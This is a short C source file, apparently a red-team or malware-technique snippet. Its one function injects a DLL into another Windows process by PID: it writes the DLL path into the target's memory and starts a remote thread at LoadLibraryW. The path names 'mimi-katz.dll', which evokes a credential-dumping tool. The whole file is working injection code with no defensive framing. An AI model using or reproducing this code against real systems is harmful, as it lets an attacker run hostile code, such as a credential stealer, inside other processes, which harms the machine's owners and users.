#include <stdio.h>
#include <Windows.h>

VOID DllInjectionRemoteProcess(UINT32 ProcessId) {

	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("C:\\tests\\mimi-katz.dll");

	printf("Injecting DLL to PID: %i\n", ProcessId);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);
}